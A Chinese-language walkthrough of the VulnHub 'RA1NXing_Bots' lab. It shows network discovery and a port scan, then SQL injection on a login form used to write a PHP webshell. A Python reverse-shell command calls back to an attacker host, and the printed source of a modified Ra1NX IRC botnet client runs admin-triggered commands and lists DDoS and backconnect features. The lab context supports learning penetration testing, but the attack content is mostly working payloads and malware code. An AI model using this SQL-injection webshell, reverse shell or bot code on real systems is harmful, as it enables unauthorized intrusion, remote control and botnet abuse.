# 下载地址

    
    
    https://download.vulnhub.com/botchallenges/RA1NXing_Bots.zip
    

# **实战演练**

使用netdiscover进行查找靶机的IP

![image.png](https://image.3001.net/images/20190803/1564839768_5d458f5842b0a.png)使用nmap对靶机系统进行端口扫描

![image.png](https://image.3001.net/images/20190803/1564839954_5d4590123751a.png)web系统存在SQL注入漏洞

    
    
    POST /index.php?page=login HTTP/1.1
    Host: 192.168.0.101
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Referer: http://192.168.0.101/index.php?page=login
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 17
    Connection: close
    Upgrade-Insecure-Requests: 1
    
    user=1&password=1

使用SQLMAP进行测试，root账号

![image.png](https://image.3001.net/images/20190803/1564840398_5d4591ce1a13a.png)查看index.php文件，
**\--file-read=/var/www/index.php**

![image.png](https://image.3001.net/images/20190803/1564840444_5d4591fc4e128.png)
添加后门

    
    
    POST /index.php?page=login HTTP/1.1
    Host: 192.168.0.101
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Referer: http://192.168.0.101/index.php?page=login
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 17
    Connection: close
    Upgrade-Insecure-Requests: 1
    
    user=1' union select '<?php system($_GET["cmd"]); ?>', '' into outfile '/var/www/bd.php'#&password=1
    

![image.png](https://image.3001.net/images/20190803/1564840806_5d459366b4cc0.png)nc反弹shell，使用NC监听端口后，使用小马执行反弹shell命令

    
    
    http://192.168.0.101/bd.php?cmd=python%20-c%20%22import%20os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%27192.168.0.104%27,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([%27/bin/sh%27,%27-i%27]);%22
    

![image.png](https://image.3001.net/images/20190803/1564841286_5d459546b69b5.png!small)  

    
    
    $ cat /var/www/botsources/botcode.php.txt
    <?php
    /*
    Modified version of the Ra1NX bot by bwall.
    The purpose of this version is for research.
    Attack functionality has been removed.
    It should be fairly easy to run on your own IRCd to run test attacks against it.
    Don't do anything stupid with this.
    ~ Think Evil, Do Good. ~
    */
    error_reporting(0);
    set_time_limit(0);
    $servers    	= "127.0.0.1";
    $ports        	= "6667";
    $admins        	= "";
    $channels    	= "#somechannel";
    $realnames     	= "jhl";
    $nicknames     	= "jhl1,jhl2,jhl3,jhl4,jhl5,jhl6,jhl7,jhl8,jhl9,jhl10,jhl11,jhl12,jhl13,jhl14,jhl15,jhl16,jhl17,jhl18,jhl19,jhl20,jhl21,jhl22,jhl23,jhl24,jhl25,jhl26,jhl27,jhl28,jhl29,jhl30";
    $chanpass 	= "trolol";
    
    #create daemon  process
    $process = "
        /usr/sbin/httpd,
        /sbin/klog,
        /usr/bin/mysql,
        /sbin/syslogd,
        /sbin/syslogd,
        /sbin/klogd -c 1 -x -x,
        /usr/sbin/acpid,
        /usr/sbin/cron
    ";
    
    $ident         = random($nickames);
    $nick         = random($nicknames);
    $realname     = random($realnames);
    $server     = random($servers);
    $port         = random($ports);
    $daemon     = random($process);
    $linas_max    = 2;
    $sleep        = 3;
    $maxtryconn    = 5;
    $maxnumber    = 6;
    $nick = "jhl";
    $daemon = "/usr/tes";
    $version = "bwall's modified RA1NX bot(safe)";
    define(_,"2-*=**!");
    
    chdir("/tmp");
    $shellfunc     = "system";
    
    ########### ENTER COMMAND / COMMAND SENDER #######
    function SEND($data) {
        global $SOCKET;
        print("OUT >>> ".$data."\n");
        fwrite($SOCKET,$data."\r\n");
    }
    
    ################### MAIN CONNECTION #####################
    function connection(){
        global $maxtryconn,$idents,$nicknames,$realnames,$servers,$ports;
        $try=1;
        $SOCKET = false;
        while(!$SOCKET && ($try <= $maxtryconn)){
            $server = random($servers);
            $port     = random($ports);
            $SOCKET = fsockopen($server,$port,$err_num,$err_msg,30);
            $GLOBALS['SOCKET']=$SOCKET;
            $try++;
            sleep(1);
        }
        if(!$SOCKET) die("Cannot connect to remote host");
        if ($SOCKET){
            $GLOBALS['ident']     = $ident    = random($nicknames);
            $GLOBALS['nick']     = $nick     = random($nicknames);
            $GLOBALS['realname']= $realname    = random($realnames);
            SEND("USER XRay 127.0.0.1 localhost : -==Ra1NX Projection==-");
            NICK($nick);
            print "Connected to ".$server.":".$port." ".$nick." (XRay@".gethostbyname($_SERVER["HTTP_HOST"]).") Ra1NX Projection\r\n";
            flush();sleep(1);
        }
    }
    
    do{
        ##### connect to server ######
        if(!$SOCKET){connection();}
    
        ######## connected! get sock output #########
        $text = fgets($SOCKET,1024);
        $text = str_replace("\r","",$text);
        $text = str_replace("\n","",$text);
        $text = $text." ";
        parser($text);
        $text = false;
        $lines = false;
    }while(1);
    
    ### GLOBAL FUNCTIONS
    
    function parser($line){
        global $chanpass,$nick,$maxnumber,$channels,$SOCKET,$version,$admins;
        $called = $sline = $iduser = $huser = $user = $useriD = $userHost = $typeMsg = $dropMsg = $adm =  $cmd = $arg = false;
    
        $sline        = $line;
        $line         = explode(" ",$line);
        $iduser     = explode("@",$line[0]);
        $huser         = explode("!",$iduser[0]);
        $user         = substr($huser[0],1,strlen($huser[0]));
        $userId        = $huser[1];
        $userHost     = $iduser[1];
        $typeMsg     = $line[1];
        $dropMsg     = ($line[2]==$nick)?$user:$line[2];
        $called        = (substr($line[3],1,strlen($line[3]))=="!cmd")?true:((substr($line[3],1,strlen($line[3]))==$nick)?true:false);
        $pubcalled        = (substr($line[3],1,strlen($line[3]))=="!bot")?true:false;
        $cmd        = (substr($line[4],0,1)=="@")?substr($line[4],1,strlen($line[4])):'shell';
        $pubcmd     = (substr($line[4],0,1)=="@")?substr($line[4],1,strlen($line[4])):false;
        if($line[5]){
            for($i=5;$i<count($line);$i++){
                $arg   .= $line[$i].(($i<(count($line)-1))?" ":"");
            }
        }
        $GLOBALS['dropMsg'] = $dropMsg;
        $GLOBALS['arg']        = $arg;
        $GLOBALS['user']    = $user;
    
        if(substr($sline,0,6)=="PING :") SEND("PONG :".substr($sline,6));
        if(eregi("VERSION",$line[3])) SEND("PRIVMSG ".$user." VERSION reply: ".$version."");
    
        print("IN >>> ".$sline."\n");
    
        if($typeMsg!="PRIVMSG"){
            switch($typeMsg){
                case "433": nick($nick.rand(0,$maxnumber)); break;
                case "001":
                    sleep(1);
                    foreach (beArray($channels) as $key => $chan) {
                        SEND("JOIN $chan $chanpass");
                    }
                break;
    	   case "JOIN":
    		sleep(1);
    	  	SEND("MODE $channels +k $chanpass");
    	   break;
            }
        }
    
        if(substr($line[3],1,strlen($line[3]))==$nick){ $called = true; }
        if($called){
            if($cmd=="shell") { $arg = $line[4]." ".$arg; }
            $cmd = ($cmd=="join")?"joins":$cmd;
            if ($typeMsg=="PRIVMSG" && admin($user) && $called && $cmd) {
                if(function_exists($cmd)){
                    $sender = "PRIVMSG ".$dropMsg." "._;
                    $GLOBALS['sender'] = $sender;
                    $arg = str_replace("\r","",$arg);
                    $arg = str_replace("\n","",$arg);
                    $cmd($arg);
                }
            }
        }
        if(substr($line[3],1,strlen($line[3]))==$nick){ $pubcalled = true; }
        if($pubcalled){
            if ($typeMsg=="PRIVMSG" && $user && $pubcalled && $pubcmd) {
                if(function_exists($pubcmd)){
                    $sender = "PRIVMSG ".$dropMsg." "._;
                    $GLOBALS['sender'] = $sender;
                    $arg = str_replace("\r","",$arg);
                    $arg = str_replace("\n","",$arg);
                    $pubcmd($arg);
                }
            }
        }
    }
    
    ####[ Ra1NX Authentication ]####
    function admin($user){
        global $admins, $SOCKET;
        $userinfo = false;
    	if(!in_array($user,beArray($admins))) return false;
        return true;
    }
    
    
    #####[ Ra1NX IRC Commands ]#####
    
    function nick($newnick) {
        global $nick, $dropMsg;
        $newnick = str_replace("\r","",$newnick);
        $newnick = str_replace("\n","",$newnick);
        if(!$newnick){return;}
        SEND("NICK ".$newnick);
        $GLOBALS['nick']=$newnick;
    }
    
    function PRIVMSG($msg){
        $dropMsg;
        SEND("PRIVMSG ".$dropMsg." ".$msg);
    }
    
    function joins($arg){
        $chan = explode(" ",$arg);
        for($i=1;$i<count($chan);$i++){
            $msg .= $chan[$i]." ";
        }
        SEND("JOIN #".str_replace("#","",$chan[0]));
        SEND("PRIVMSG #".str_replace("#","",$chan[0])." ".$msg);
    }
    
    function part($arg){
        $part = explode(" ",$arg);
        $chan = $part[0];
        for($i=1;$i<count($part);$i++){
            $msg .= $part[$i].(($i<(count($part)-1))?" ":"");
        }
        SEND("PART #".str_replace("#","",$chan)." ".$msg);
    }
    
    function msg($args){
        $arg = explode(" ",$args);
        $obyek = $arg[0];
        for($i=1;$i<count($arg);$i++){
            $msg .= $arg[$i]." ";
        }
        SEND("PRIVMSG ".$obyek." ".$msg);
    }
    
    function off($arg=''){
        if($arg==" ") $arg=false;
        $arg = (!$arg)?"15,1 The only thing that appears in my head Just to 4S8.4U8.4I8.4C8.4I8.4D8.4E15 away ":$arg;
        SEND("QUIT :".$arg);
    }
    
    function ison($arg){
        global $dropMsg,$SOCKET,$nick;
        SEND("ISON ".$arg);
        while(!$complete){
            $useron = fgets($SOCKET,128);
            $complete = (eregi("303 ".$nick." :",$useron))?1:0;
        }
        $ison = (eregi("303 ".$nick." :".$arg,$useron))?1:0;
        return $ison;
    }
    
    function mode_n($chan){
        SEND("PRIVMSG ".$chan." ");
        $mode = fgets($SOCKET,2500);
        return (eregi($chan." No external channel messages",$mode))?1:0;
    }
    
    function cycle($arg){
        part($arg);
        joins($arg);
    }
    
    function safemode(){
        if(@ini_get("safe_mode")) return false;
        if(eregi("on",@ini_get("safe_mode"))) return false;
        return true; // safemode is OFF
    }
    
    ####[ Ra1NX Port ]####
    function port($arg){
        global $SOCKET,$sender;
        $args = explode(" ",$arg);
        $host = $args[0];
        $port = $args[1];
        $pesan = checkport($host,$port,2);
        $pesan = "is ".(eregi("failed",$pesan)?$pesan:"Accepted");
        SEND($sender."7Connection to ".$host.":".$port." ".$pesan);
    }
    
    ###[ Ra1NX Command Help ]###
    function help($arg){
        global $SOCKET,$sender;
        $args = explode(" ",$arg);
        $opt = $args[0];
        
        $tmpl = $sender."10@";
        $hfile[]= 'irc: join #channel msg';
        $hfile[]= 'irc: part #channel msg';
        $hfile[]= 'irc: cycle #channel msg';
        $hfile[]= 'irc: msg nick/#channel msg';
        $hfile[]= 'irc: whois nick';
        $hfile[]= 'irc: find nick';
        $hfile[]= 'irc: nick newnick';
        $hfile[]= 'irc: off msg';
        
        $hfile[]= 'flood: tsunami nick/#channel';
        $hfile[]= 'flood: ctcpflood nick/#channel';
        
        $hfile[]= 'shell: shell command';
        $hfile[]= 'shell: download url';
        
        $hfile[]= 'domaintool: ipwhois hostname';
        $hfile[]= 'domaintool: reverse hostname';
        $hfile[]= 'domaintool: iptrace hostname';
        $hfile[]= 'domaintool: port hostname port';
        $hfile[]= 'domaintool: nmap hostname';
        $hfile[]= 'domaintool: proxy';
        
        $hfile[]= 'ddos: udpflood target packetsize times';
        $hfile[]= 'ddos: tcpflood target port packetsize times';
        $hfile[]= 'ddos: httpflood target packetsize times';
        $hfile[]= 'ddos: pingflood target times';
        $hfile[]= 'ddos: apacheflood target times';
        $hfile[]= 'ddos: synflood target packetsize times';
        $hfile[]= 'ddos: superdos target port';
        
        $hfile[]= 'rconnect: backconnect ip port {perl|c|nc|php}';
        $hfile[]= 'rconnect: bindshell port {perl|nc|php}';
        
        $hfile[]= 'info: info';
        $hfile[]= 'info: myself';
        $hfile[]= 'info: myip';
        $hfile[]= 'info: myshell';
        
        if(!$opt){SEND($sender."2Ra1NX v2.0 Command Help");}
        foreach($hfile as $key => $val){
            $send = true;
            if($opt!=""){
                $send = (eregi($opt.":",$val))?true:false;
            }
            if($send){
                SEND(((eregi("shell command",$val))?$sender."10":$tmpl).substr($val,(strpos($val,": ")+2),strlen($val)));
            }
        }
        if(!$opt){SEND($tmpl."help {irc|flood|ddos|domaintool|rconnect|shell|info}");}
    }
    
    ###[ Ra1NX AddOns ]###
    function beArray($val,$param=','){
        $val = str_replace("\r","",$val);
        $val = str_replace("\n","",$val);
        $val = str_replace("\t","",$val);
        $val = str_replace(" ","",$val);
        return explode($param,$val);    
    }
    
    function random($var){
        $var = beArray($var);
        $max = count($var)-1;
        $key = rand("0",$max);
        $output = str_replace(" ","",$var[$key]);
        $output = str_replace("\r","",$output);
        $output = str_replace("\n","",$output);
        $output = str_replace("\t","",$output);
        return $output;
    }
    ?>
    
    

  

